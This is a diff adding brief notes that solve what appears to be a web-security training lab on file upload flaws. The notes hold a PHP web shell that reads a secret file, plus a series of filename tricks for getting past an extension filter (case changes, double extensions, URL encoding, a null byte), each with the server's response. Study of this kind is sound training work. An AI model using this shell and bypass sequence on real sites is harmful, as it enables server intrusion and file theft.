@@ -1,0 +1,30 @@
+vulnerable path: /my-account
+vulnerable function: avatar upload function
+
+script:
+file name: lab_5_shell.php
+->
+<?php echo file_get_contents('/home/carlos/secret/'); ?>
+<-
+
+try upload the php script
+intercept the request and send it to the repeater
+
+response -> Sorry, only JPG & PNG files are allowed Sorry, there was an error uploading your file. <-
+
+go to the repeater and analyse the request
+Analysis: 
+filename="lab_5_shell.pHp" -> response -> 403 Forbidden
+filename="lab_5_shell.Php" -> response -> 403 Forbidden
+filename="lab_5_shell.phP" -> response -> 403 Forbidden
+filenname="lab_5_shell.php.jpg" -> response -> 200 OK
+
+let's go to /files/avatars/lab_5_shell.php to see if the file got executed or not -> response -> empty page
+
+filename="lab_5_shell.php." -> response -> 403 Forbidden
+filename="lab_5_shell%2Ephp" -> response -> 403 Forbidden
+filenname="lab_5_shell.php%00jpg" -> response -> 200 OK
+
+let's go to /files/avatars/lab_5_shell.php to see if the file got executed or not -> response -> reflected data: kT13ua8pvLyhPxn93XmDNg8Me7FYvOOm
+
+solved
